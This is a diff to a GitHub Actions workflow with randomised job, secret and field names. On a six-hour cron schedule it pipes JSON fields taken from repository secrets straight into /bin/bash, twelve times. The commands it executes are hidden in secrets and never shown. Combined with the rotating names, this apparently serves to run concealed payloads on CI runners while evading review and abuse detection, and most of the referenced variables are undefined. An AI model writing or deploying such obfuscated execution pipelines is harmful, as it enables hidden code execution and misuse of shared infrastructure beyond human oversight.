@@ -2,7 +2,7 @@ name: meilitong3214
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
+    - cron: '58 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: meilitong3214
         env:
-          zw3: ${{ secrets.zw3 }}
+          mtst3494: ${{ secrets.mtst3494 }}
         run: |
-          echo $zw3 | jq -r .w29646 | /bin/bash
-          echo $veph931 | jq -r .cyp23 | /bin/bash
-          echo $v8 | jq -r .w81 | /bin/bash
-          echo $p3947 | jq -r .the77836 | /bin/bash
-          echo $zxadx636 | jq -r .mpu3751 | /bin/bash
-          echo $ye33 | jq -r .rs0832 | /bin/bash
-          echo $fg6159 | jq -r .lfufe8680 | /bin/bash
-          echo $mqzb928 | jq -r .q458 | /bin/bash
-          echo $zm93589 | jq -r .iz0031 | /bin/bash
-          echo $su73 | jq -r .zcaix702 | /bin/bash
+          echo $mtst3494 | jq -r .vqs715 | /bin/bash
+          echo $pdj519 | jq -r .gle48 | /bin/bash
+          echo $vtd7 | jq -r .ftu60 | /bin/bash
+          echo $fveeo49587 | jq -r .xhai18 | /bin/bash
+          echo $v08 | jq -r .q5 | /bin/bash
+          echo $juksp43 | jq -r .k76455 | /bin/bash
+          echo $daraw24970 | jq -r .qsgc282 | /bin/bash
+          echo $jeqt3 | jq -r .va1 | /bin/bash
+          echo $u8 | jq -r .h3777 | /bin/bash
+          echo $rrs44046 | jq -r .anicc95 | /bin/bash
+          echo $fzy563 | jq -r .io2792 | /bin/bash
+          echo $zs382 | jq -r .qktmb1332 | /bin/bash
 
